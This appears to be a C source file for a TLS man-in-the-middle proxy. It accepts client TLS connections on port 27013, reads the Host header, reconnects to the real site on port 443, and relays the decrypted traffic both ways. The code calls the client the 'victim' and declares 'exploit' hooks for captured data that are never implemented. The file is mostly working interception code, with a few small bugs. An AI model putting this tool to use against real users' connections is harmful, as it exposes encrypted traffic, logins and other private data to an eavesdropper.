#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <pthread.h>

#include "sslutil.h"

#define FAILFAST(function, msg)                       \
    perror("Error occurred in [" #function "]:" msg); \
    exit(EXIT_FAILURE);
#define LOGERROR(category, msg) perror("Error occurred in [" #category "] " msg);

int create_socket(uint16_t port)
{
    int skt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (skt < 0)
    {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(skt, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        FAILFAST(create_socket, "Unable to bind");
    }

    if (listen(skt, SOMAXCONN) < 0)
    {
        FAILFAST(create_socket, "Unable to listen");
    }

    return skt;
}

typedef struct
{
    int client;
    SSL *ssl;
} SSLRequest;
void *handleRequest(void *request);
void transferData(SSL *victim, SSL *host);
void exploitVictimData(char *buffer, int len);
void exploitHostData(char *buffer, int len);

int main(int argc, char **argv)
{
    int port = 27013;
    SSL_library_init();
    SSL_load_error_strings();
    SSL_CTX *ctx = ssl_create_context();
    ssl_configure_context(ctx);

    int sock = create_socket(port);
    // signal(SIGPIPE, SIG_IGN);

    printf("Listening on port %d\n", port);
    while (1) // handle connection
    {
        struct sockaddr_in addr;
        int len = sizeof(addr);
        SSL *ssl;
        int client = accept(sock, (struct sockaddr *)&addr, &len);
        if (client < 0)
        {
            FAILFAST(main, "Unable to accept");
        }
        ssl = SSL_new(ctx);
        SSLRequest *req = malloc(sizeof(SSLRequest));
        req->client = client;
        req->ssl = ssl;
        pthread_t thread;
        pthread_create(&thread, NULL, handleRequest, req);
    }

    SSL_CTX_free(ctx);
}

void errCloseSSL(SSL *ssl, int err)
{
    int fd = SSL_get_fd(ssl);
    if (err != SSL_ERROR_SYSCALL && err != SSL_ERROR_SSL)
        SSL_shutdown(ssl);
    SSL_free(ssl);
    if (fd >= 0)
        close(fd);
}

#define BUF_SIZE 8192

void *handleRequest(void *req)
{
    SSLRequest *request = req;
    SSL *ssl = request->ssl;
    int client = request->client;
    SSL_set_fd(ssl, client);
    int err = 0;
    int ret = 0;
    char buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);

    if (ret = SSL_accept(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        err = SSL_get_error(ssl, ret);
    }
    if (err != 0) // fatal errors
    {
        errCloseSSL(ssl, err);
        return NULL;
    }
    int serverSocket = 0;
    size_t readBytes = 0;
    char *host = NULL;
    int content_length = 0;
    if (ret = SSL_read_ex(ssl, buffer, BUF_SIZE, &readBytes) >= 0)
    {
        if (readBytes > 0) // we should have read header
        {
            char *lineBegin = buffer;
            for (char *pos = buffer; pos < buffer + BUF_SIZE - 3; pos++)
            {
                if (*pos == '\r' && *(pos + 1) == '\n') // lineEnd
                {
                    char *nextStart = pos + 2;
                    if (lineBegin)
                    {
                        if (strncmp(lineBegin, "Host", 4) == 0) // HOST
                        {
                            host = malloc(pos - lineBegin);
                            memset(host, 0, pos - lineBegin);
                            char *start = lineBegin + 5;
                            if (*start == ' ')
                                start++;
                            memcpy(host, start, pos - start);
                            // we found what we want, break
                            break;
                        }
                    }
                    if (*nextStart == '\r' && *(nextStart + 1) == '\n') // header end
                        break;
                    lineBegin = pos + 2;
                }
            }
        }
    }
    else
    {
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr;
#ifdef DEBUG
    host = "localhost";
#else
    if (host == NULL) // could not resolve host
    {
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
#endif
    struct hostent *remoteHost = gethostbyname(host);
    if (remoteHost == NULL || remoteHost->h_addrtype != AF_INET || remoteHost->h_addr_list[0] == 0)
    {
        LOGERROR(gethostbyname, "Unable to resolve remote host");
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
    addr.sin_addr.s_addr = *(u_int32_t *)remoteHost->h_addr_list[0];
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket < 0)
    {
        perror("Unable to create socket");
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
    if (connect(serverSocket, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        LOGERROR(handleRequest, "Unable to bind");
        close(serverSocket);
        SSL_write(ssl, "Failed to connect to host!", 26);
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
    SSL_CTX *subContext = SSL_CTX_new(TLS_client_method());
    SSL *subSsl = SSL_new(subContext);
    SSL_set_fd(subSsl, serverSocket);
    if (ret = SSL_connect(subSsl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        err = SSL_get_error(subSsl, ret);
        errCloseSSL(subSsl, err);
        errCloseSSL(ssl, SSL_ERROR_NONE);
        return NULL;
    }
    ret = SSL_write(subSsl, buffer, readBytes);
    if (ret >= 0) // good connection
    {
        transferData(ssl, subSsl);
    }

    SSL_shutdown(subSsl);
    SSL_free(subSsl);
    close(serverSocket);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client);
}

void transferData(SSL *victim, SSL *host)
{
    char buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);
    int ret = 0;
    struct timeval timeout = {0, 1000000};
    int victimSocket = SSL_get_fd(victim);
    int hostSocket = SSL_get_fd(host);

    bool victimReadComplete = false;
    bool hostReadComplete = false;

    while (1)
    {
        /* code */
        fd_set fd_read;
        FD_ZERO(&fd_read);
        FD_SET(victimSocket, &fd_read);
        FD_SET(hostSocket, &fd_read);
        int max = victimSocket > hostSocket ? victimSocket + 1 : hostSocket + 1;

        ret = select(max, &fd_read, NULL, NULL, &timeout);
        if (ret < 0)
        {
            LOGERROR(transferData, "Failed to select!");
            break;
        }
        else if (ret == 0)
        {
            continue;
        }

        size_t readBytes;
        size_t writtenBytes;
        if (!victimReadComplete && FD_ISSET(victimSocket, &fd_read))
        {
            ret = SSL_read_ex(victim, buffer, BUF_SIZE, &readBytes);
            if (ret > 0) // success
            {
                if (readBytes == 0)
                    victimReadComplete = true;
                ret = SSL_write_ex(host, buffer, readBytes, &writtenBytes);
                if (!ret || readBytes != writtenBytes) // error sending to host
                {
                    LOGERROR(transferData, "Failed to transmit to Host!");
                    break;
                }
            }
            else
            {
                int err = SSL_get_error(victim, ret);
                if (err != SSL_ERROR_ZERO_RETURN)
                {
                    victimReadComplete = true;
                    LOGERROR(transferData, "Failed to read from victim!");
                }
            }
        }
        if (FD_ISSET(hostSocket, &fd_read))
        {
            ret = SSL_read_ex(host, buffer, BUF_SIZE, &readBytes);
            if (ret > 0) // success
            {
                if (readBytes == 0)
                    hostReadComplete = true;
                ret = SSL_write_ex(victim, buffer, readBytes, &writtenBytes);
                if (!ret || readBytes != writtenBytes) // error sending to victim
                {
                    LOGERROR(transferData, "Failed to transmit to victim!");
                    break;
                }
            }
            else
            {
                int err = SSL_get_error(victim, ret);
                if (err != SSL_ERROR_ZERO_RETURN)
                {
                    LOGERROR(transferData, "Failed to read from Host!");
                }
                else
                {
                    hostReadComplete = true;
                    printf("Connection #%d ended!", pthread_self());
                }
                break;
            }
        }
        if (victimReadComplete && hostReadComplete)
        {
            printf("Connection #%d ended!", pthread_self());
            break;
        }
    }
}